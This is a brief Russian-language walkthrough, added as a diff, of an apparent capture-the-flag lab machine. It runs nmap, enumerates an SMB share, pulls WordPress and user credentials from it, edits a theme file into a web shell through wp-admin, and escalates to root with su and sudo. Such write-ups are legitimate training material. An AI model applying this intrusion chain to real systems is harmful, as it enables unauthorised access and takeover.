@@ -1,0 +1,33 @@
+очеень легкая, сделала ее буквально за 20 минут
+
+1)nmap -A  -sS -T4 192.168.226.180 -p- 
+    показало стандартный 22-ssh,80-http и на 139-smb, а вот это уже интереснее
+
+2)enum4linux -S 192.168.226.180
+    share$
+
+    подключемся к ней
+        smbclient //192.168.226.180/share$
+            wordpress
+            deets.txt
+    
+    там было еще много чего интересного, но я указала главное для нас
+        get wordpress/wp-config.pgp
+            Admin:TogieMYSQL12345^^
+        
+        get deets.txt
+            password 12345
+
+3)заходим на wordpress/wp-admin/ с этими данными Admin:TogieMYSQL12345^^
+    appearance> editor > (some_file_name).php > change to shell.php
+
+4) wordpress/wp-content/themes/<your_changed_themes>/<some_file_name>.php
+
+5)вот мы и стали www-data, проверим найденный когда-то пароль 12345
+    su togie
+        12345
+    
+    вот мы и стали togie, а ему доступны все проэксплуатировать
+        sudo su
+
+    вот мы и рут
